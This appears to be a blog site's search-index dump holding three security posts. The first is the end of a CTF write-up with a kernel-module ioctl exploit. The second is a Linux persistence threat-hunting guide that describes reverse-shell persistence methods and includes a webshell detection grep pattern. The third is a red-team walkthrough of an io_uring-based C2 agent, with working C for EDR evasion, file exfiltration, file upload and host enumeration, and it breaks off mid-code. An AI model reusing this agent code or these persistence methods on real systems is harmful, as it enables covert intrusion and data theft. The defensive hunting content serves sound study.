0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = 